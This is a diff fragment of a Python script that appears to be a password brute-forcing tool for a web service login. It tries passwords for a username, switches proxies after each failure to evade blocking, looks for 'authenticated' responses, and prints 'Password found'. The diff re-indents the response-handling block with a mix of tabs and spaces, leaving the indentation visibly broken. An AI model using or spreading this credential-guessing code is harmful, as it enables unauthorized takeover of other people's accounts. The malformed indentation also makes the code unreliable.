@@ -672,18 +672,19 @@ def signin(password,username):
     except Exception as e:
         print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
         signin(password,username)
-        print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
-        try:
-            print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
-        except KeyError:
-            pass
-        if r.json()['status'] == "fail":
-            print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
-            signin(password,username)
-            pass
-        else:
-            pass
-        if  'authenticated":true' in r.text or 'userId' in r.text:
+    print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
+	try:
+	       print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
+	except KeyError:
+	       pass
+	
+	if r.json()['status'] == "fail":
+	           print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
+	           signin(password,username)
+	           pass
+	else:
+	       pass
+	if  'authenticated":true' in r.text or 'userId' in r.text:
             rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
             print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
             print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
